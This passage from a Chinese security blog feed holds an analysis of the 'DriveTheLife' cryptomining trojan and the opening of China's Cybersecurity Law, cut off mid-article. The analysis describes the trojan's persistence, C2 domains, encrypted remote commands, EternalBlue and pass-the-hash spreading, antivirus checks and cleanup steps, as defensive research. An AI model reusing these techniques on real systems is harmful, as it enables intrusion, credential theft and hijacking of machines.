    <url>/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">文件: updll.exe</span><br><span class="hljs-section">大小: 201,776 bytes</span><br><span class="hljs-section">文件签名:Shenzhen Smartspace Software technology Co.,Limited</span><br><span class="hljs-section">修改时间: 2020年12月2日, 14:05:51</span><br><span class="hljs-section">MD5: 59B18D6146A2AA066F661599C496090D</span><br><span class="hljs-section">SHA1: 48A3046381A963A2471875EF67886E35B90E8541</span><br><span class="hljs-section">CRC32: 80488116</span><br></code></pre></td></tr></table></figure><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p>首先使用PEiD和ExeInfo工具对样本进行查壳 以下是查壳结果</p><img src="image-20201207093542398.png" alt="image-20201207093542398" style="zoom: 50%;" /><p><strong>结论：</strong>病毒使用VC6编写的  无壳</p><h1 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h1><h2 id="基础静态分析"><a href="#基础静态分析" class="headerlink" title="基础静态分析"></a>基础静态分析</h2><h3 id="查看字符串"><a href="#查看字符串" class="headerlink" title="查看字符串"></a>查看字符串</h3><p>首先在IDA中查看程序的字符串信息 看看能否得出某些信息</p><img src="image-20201207095219894.png" alt="image-20201207095219894" style="zoom:50%;" /><p>在IDA中看到字符串中含有AV检测、系统进程svhost.exe、矿机信息I am tHe xmr reporter等。但具体的还需要再进一步确认。</p><img src="image-20201207095805491.png" alt="image-20201207095805491" style="zoom:50%;" /><p>紧接着看到了http链接，有可能是病毒的通联地址。然后就是大量CMD命令，大概是在执行某些恶意操作 。</p><p>字符串的部分目前提取的信息就这么多，主要还是结合进一步的代码分析。</p><h3 id="使用PEiD识别加密算法"><a href="#使用PEiD识别加密算法" class="headerlink" title="使用PEiD识别加密算法"></a>使用PEiD识别加密算法</h3><p>使用PEID的Kyrpto ANALyzer插件扫描病毒程序，来识别加密算法。扫描结果如图所示</p><img src="image-20201207144939176.png" alt="image-20201207144939176" style="zoom:50%;" /><p>由上图可知，该病毒使用RC4加密算法。</p><h3 id="查看导入表"><a href="#查看导入表" class="headerlink" title="查看导入表"></a>查看导入表</h3><img src="image-20201207101230560.png" alt="image-20201207101230560" style="zoom:50%;" /><p>输入表存在ADVAPI32.dll中的注册表和windows服务API，说明有可能该病毒存在创建、操作注册表和windows服务的行为。存在urlmon.dll的URLOpenBlockingStreamA API，有可能从网上URL下载数据（有可能是上面字符串提取的URL）。存在WS2_32.dll Windows Sockets应用程序接口， 用于支持Internet和网络应用程序。</p><p>此处需要留意</p><h3 id="查看资源段"><a href="#查看资源段" class="headerlink" title="查看资源段"></a>查看资源段</h3><p>接着查看病毒的资源段</p><img src="image-20201207103845767.png" alt="image-20201207103845767" style="zoom:50%;" /><p>存在100号、101号、102号三个资源，从资源头看不出是什么文件， 猜测有可能经过加密。</p><h2 id="基础动态分析"><a href="#基础动态分析" class="headerlink" title="基础动态分析"></a>基础动态分析</h2><h3 id="查看进程树"><a href="#查看进程树" class="headerlink" title="查看进程树"></a>查看进程树</h3><p>首先使用<code>ProcessMonitor</code>查看一下进程树。</p><img src="image-20201208111619297.png" alt="image-20201208111619297" style="zoom:50%;" /><h3 id="注册表监控"><a href="#注册表监控" class="headerlink" title="注册表监控"></a>注册表监控</h3><p>使用regshot对运行病毒前后做一个快照进行比对，直接查看结果。</p><img src="image-20201208112814269.png" alt="image-20201208112814269" style="zoom:50%;" /><img src="image-20201208111129817.png" alt="image-20201208111129817" style="zoom:50%;" /><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>接下来是文件的监控</p><img src="image-20201208110819074.png" alt="image-20201208110819074" style="zoom:50%;" /><h3 id="网络监控"><a href="#网络监控" class="headerlink" title="网络监控"></a>网络监控</h3><p>请求恶意DNS域名</p><img src="image-20201209103816961.png" alt="image-20201209103816961" style="zoom:50%;" /><p>上传主机信息，并获取加密数据。</p><img src="image-20201209103458940.png" alt="image-20201209103458940" style="zoom:50%;" /> <h3 id="服务监控"><a href="#服务监控" class="headerlink" title="服务监控"></a>服务监控</h3><p>创建了两个服务：Ddriver和WebServers。</p><img src="image-20201208113024835.png" alt="image-20201208113024835" style="zoom:50%;" /><h1 id="使用IDA进行详细分析"><a href="#使用IDA进行详细分析" class="headerlink" title="使用IDA进行详细分析"></a>使用IDA进行详细分析</h1><p>主程序启动后首先尝试启动名为Ddriver的服务进程，如果主机已经被感染则直接执行服务函数进行挖矿等恶意行为，如果主机是初次被感染则执行感染配置行为。</p><img src="image-20201207105301424.png" alt="image-20201207105301424" style="zoom:50%;" /><p>第一步检查自身名称是否为svhost.exe或者svchost.exe，如果程序名称不为svhost.exe或者svchost.exe则从资源节中解密释放PE文件（102号资源），释放文件的hash：a4b7940b3d6b03269194f728610784d6，最终在磁盘中释放路径为C:\windows\temp\ttt.exe，释放完成后便执行该文件。</p><img src="image-20201207110637362.png" alt="image-20201207110637362" style="zoom:50%;" /><p>释放执行ttt.exe文件后便多次使用cmd命令清理系统原来感染的老版本的挖矿程序，为新版挖矿程序的安装和运行清理环境。结束删除老版的挖矿程序见下图。</p><img src="image-20201207111435563.png" alt="image-20201207111435563" style="zoom:50%;" /><p>设置Windows防火墙开启65531，65532，65533端口，在防火墙规则中分别命名为UDP2，UDP，ShareService，同时开启端口转发，将来自65532端口的流量转发到1.1.1.1地址的53端口，将来自65531端口的流量转发到1.1.1.1地址的53端口。设置防火墙并设置端口代理见下图。</p><p><img src="/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20201207111615677.png" alt="image-20201207111615677"></p><p>拷贝主程序到C:\windows\system32\svhost.exe并设置隐藏属性，同时拷贝一份到C:\windows\system32\drivers\svchost.exe，之后设置计划任务同时设置注册表项，实现程序的开机启动和定期触发执行。拷贝主程序文件到系统关键目录下、设置计划任务和注册表项见下图。</p><img src="image-20201207112722576.png" alt="image-20201207112722576" style="zoom:50%;" /><img src="image-20201207112801022.png" alt="image-20201207112801022" style="zoom:50%;" /><p>完成上述配置后尝试使用CreateServiceA函数将C:\windows\system32\drivers\svchost.exe注册为服务，如果服务存在则修改服务配置，如果CreateServiceA函数调用失败则使用CMD方式调用sc create创建服务，最终尝试使用net start和StartServiceA函数的方式启动服务函数。创建Ddriver服务的首选方式，启动创建的Ddriver服务见下图。</p><img src="image-20201207113558713.png" alt="image-20201207113558713" style="zoom:50%;" /><img src="image-20201207113711717.png" alt="image-20201207113711717" style="zoom:50%;" /><p>服务主函数中首先根据系统位数拼接后续将要使用到的字符串资源，包括从恶意域名临时下载的文件以及解密之后的文件，和后续用来伪装成任务管理器共享进程进行挖矿操作taskmgr.exe。拼接后续需要使用的字符串见下图。</p><img src="image-20201207130526153.png" alt="image-20201207130526153" style="zoom:50%;" /><p>创建名为“it is holy shit”的互斥体防止进程重复启动运行，根据系统位数解密释放对应的资源文件，64位系统解密释放100号资源，32位系统解密释放标号为101号资源，释放路径为C:\Windows\system32\drivers\taskmgr.exe(64位系统：C:\Windows\SysWOW64\drivers\taskmgr.exe)。利用互斥体防止进程重复启动，根据系统位数释放taskmgr.exe文件见下图。</p><img src="image-20201207132730798.png" alt="image-20201207132730798" style="zoom:50%;" /><img src="image-20201207132921307.png" alt="image-20201207132921307" style="zoom:50%;" /><p>之后创建四个线程分别进行相关的恶意操作，第一个线程根据主机中的进程和主机系统相关参数调整挖矿程序的运行状态，当用户打开任务管理器浏览时会自动关闭伪装程序taskmgr.exe，使其不被用户发现；第二个线程每隔10s尝试启动C:\Windows\temp\svchost.exe(永恒之蓝漏洞攻击文件)，实现内网的横向感染传播；第三个线程使用Wmic命令，每10秒对进程进行一次检查，触发时将结束挖矿进程；第四个线程打开监听65533端口。</p><img src="image-20201207133414011.png" alt="image-20201207133414011" style="zoom:50%;" /><p>收集主机信息并发送到远程服务器，收集的信息包括主机ID，GUID，MAC地址，用户名，系统版本，系统位数，CPU型号，安装的反病毒软件(能够识别的杀软包括:360tray.exe|360sd.exe|avp.exe|KvMonXP.exe|RavMonD.exe|Mcshield.exe|egui.exe|kxetray.exe|knsdtray.exe|TMBMSRV.exe|avcenter.exe|ashDisp.exe|rtvscan.exe|ksafe.exe|QQPCRTP.exe)等等，最终在下载下一步指令的同时将上述信息传输到远程服务器。收集发送到远程服务器的主机信息见下图。</p><img src="image-20201207133857486.png" alt="image-20201207133857486" style="zoom:50%;" /><p>之后尝试访问远程服务器中指定的文件内容，从而获取执行指令，在本地解密后解析执行指令，发送的指令通过RC4+RSA算法进行加密，本地获取指令后通过硬编码的RSA公钥进行解密，最终解析执行远程命令。</p><p>由接受到的*.png中的指令内容下载指定的文件执行，当前指令的意图是从恶意域名http[:]&#x2F;&#x2F;dl.haqo.net&#x2F;下载i.exez资源，该资源为加密状态，下载到本地后解密执行，最终下载解密到C:\windows\temp\svchost.exe，目前下载的程序为永恒之蓝漏洞利用程序，该程序利用445端口实现了病毒的内网横向传播操作，该利用工具中还增加了PASS-THE-HASH的模块，尝试利用内网弱口令进行远程拷贝执行感染操作。下载指定文件解密执行见下图。</p><img src="image-20201207140500099.png" alt="image-20201207140500099" style="zoom:50%;" /><p>释放的ttt.exe文件执行之后会将自身移动到C:\Windows\System32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)并设置了隐藏属性，将自身写入计划任务，任务名为WebServers，每隔50分钟执行一次C:\Windows\system32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)，并创建服务WebServers设置为开机自启动。释放的ttt.exe文件被移动到指定路径、释放的ttt.exe（wmiex.exe）文件实现的命令见下图。</p><img src="clip_image002.jpg" alt="img" style="zoom:50%;" /><img src="clip_image004.jpg" alt="img" style="zoom:50%;" /><p>WebServers服务启动后会向指定的三个域名发起Get请求将获取的主机相关信息发送到远程服务器（pp.abbny.com、oo.beahh.com和ii.haqo.net），从而收集主机的相关信息，其中包含主机名，标识主机的GUID，主机MAC地址，主机系统和操作系统位数。上传信息所到的恶意域名见下图。</p><img src="clip_image005.png" alt="img"  /><p>WebServers服务同时具备Ddriver服务的联网功能，通过尝试下载指定域名的u.png文件，图片文件中包含了加密的指令内容，攻击者可以通过编辑该文件从而控制感染主机进行任意操作，也可以修改指令改变所下发的指令内容，当前该文件并不存在，因此WebServers不会执行其他恶意行为，仅仅处于等待指令的状态，在每次开机以及开机状态后每隔50分钟检查接收一次远程指令，wmiex.exe中的代码和svchost主程序中网络相关的代码基本一致，RSA公钥也是一样的，因此在这里算是攻击者的一个重复性操作。wmiex.exe和svchost.exe硬编码的公钥信息见下图。</p><img src="clip_image007.jpg" alt="img" style="zoom:50%;" /><h2 id="对病毒总体行为的总结"><a href="#对病毒总体行为的总结" class="headerlink" title="对病毒总体行为的总结"></a>对病毒总体行为的总结</h2><p>经对比分析，该病毒为“驱动人生”木马，通过驱动人生的升级通道下发。该病毒执行后便会将自身移动到系统关键目录并释放多个文件执行，上传主机的相关信息并从指定的恶意域名查询指令，根据黑客指令执行恶意行为。感染范围是安装了受影响的驱动人生程序的Windows系统，和内网中未打MS17-010系统补丁且开启445端口的Windows系统。</p><table><thead><tr><th><strong>文件行为：</strong></th></tr></thead><tbody><tr><td>下载保存文件到c:\windows\temp\updater.exe，执行后移动到其他位置</td></tr><tr><td>移动文件到c:\windows\system32\svhost.exe，并设置隐藏属性</td></tr><tr><td>拷贝文件到c:\windows\system32\drivers\svchost.exe，并设置隐藏属性</td></tr><tr><td>释放文件到c:\windows\system32\drivers\taskmgr.exe，并设置隐藏属性</td></tr><tr><td>释放文件到c:\windows\system32\wmiex.exe，并设置隐藏属性</td></tr><tr><td>下载文件到c:\windows\temp\svchost，此文件为永恒之蓝漏洞利用工具</td></tr><tr><td>释放文件到c:\windows\temp\m.ps1，此文件为mimikatz密码hash提取工具</td></tr><tr><td>释放文件到c:\windows\temp\mkatz.ini，此文件包含提取本机用户的hash值</td></tr><tr><td>注：在Windows64位系统中c:\windows\system32替换为c\windows\SysWOW64</td></tr></tbody></table><table><thead><tr><th><strong>注册表行为：</strong></th></tr></thead><tbody><tr><td>创建HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver</td></tr><tr><td>创建HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers</td></tr></tbody></table><table><thead><tr><th><strong>网络行为：</strong></th></tr></thead><tbody><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;i.haqo.net</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;p.abbny.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;o.beahh.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;ii.haqo.net</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;pp.abbny.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;oo.beahh.com</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;i.haqo.net&#x2F;i.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;p.abbny.com&#x2F;im.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;o.beahh.com&#x2F;i.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;ii.haqo.net&#x2F;u.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;pp.abbny.com&#x2F;u.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;oo.beahh.com&#x2F;u.png</td></tr></tbody></table><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><table><thead><tr><th><strong>删除计划任务，结束病毒进程并删除服务：</strong></th></tr></thead><tbody><tr><td>删除名为Ddrivers、WebServers、DnsScan、\Microsoft\Windows\Bluetooths的计划任务</td></tr><tr><td>删除可能存在的计划任务Certificate和Credentials</td></tr><tr><td>结束名为wmiex.exe进程以及描述为“svchost”的svchost进程</td></tr><tr><td>删除名为Ddriver和WebServers的服务项</td></tr></tbody></table><table><thead><tr><th><strong>删除下载和释放的病毒文件：</strong></th></tr></thead><tbody><tr><td>c:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start  Menu\Programs\Startup\run.bat</td></tr><tr><td>c:\Users[Username]\AppData\Roaming\Microsoft\cred.ps1</td></tr><tr><td>c:\programdata\microsoft\cred.ps1</td></tr><tr><td>c:\windows\temp\updater.exe（upinstalled.exe）</td></tr><tr><td>c:\windows\system32\svhost.exe</td></tr><tr><td>c:\windows\system32\drivers\svchost.exe</td></tr><tr><td>c:\windows\system32\drivers\taskmgr.exe</td></tr><tr><td>c:\windows\system32\wmiex.exe</td></tr><tr><td>c:\windows\temp\svchost</td></tr><tr><td>c:\windows\temp\m.ps1</td></tr><tr><td>c:\windows\temp\mkatz.ini</td></tr><tr><td>注：[Username]替换为当前登录的用户名</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒创建的注册表项：</strong></th></tr></thead><tbody><tr><td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver</td></tr><tr><td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒设置的防火墙栏目：</strong></th></tr></thead><tbody><tr><td>删除入站规则名为UDP，开放65532端口的规则</td></tr><tr><td>删除入站规则名为UDP2，开放65531端口的规则</td></tr><tr><td>删除入站规则名为ShareService，开放65533端口的规则</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒设置的端口转发的设置：</strong></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>netsh interface  portproxy delete v4tov4 listenport&#x3D;65531</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>netsh interface  portproxy delete v4tov4 listenport&#x3D;65532</td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>  注：通过CMD管理员执行以上命令  </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/network/196594.html">https://www.freebuf.com/articles/network/196594.html</a></p><p><a href="https://app.any.run/tasks/14168f29-4921-4dc4-a28b-113e3ed9fbe7/">https://app.any.run/tasks/14168f29-4921-4dc4-a28b-113e3ed9fbe7/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>驱动人生</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>望周知</title>
    <link href="/2022/04/11/%E6%9C%9B%E5%91%A8%E7%9F%A5/"/>
    <url>/2022/04/11/%E6%9C%9B%E5%91%A8%E7%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。</p><h2 id="法律全文"><a href="#法律全文" class="headerlink" title="法律全文"></a>法律全文</h2><h3 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章 总则"></a>第一章 总则</h3><p>第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h3 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h3><p>第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h3 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h3><p>第一节　一般规定</p><p>第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节　关键信息基础设施的运行安全</p><p>第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h3 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h3><p>第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>第四十八条　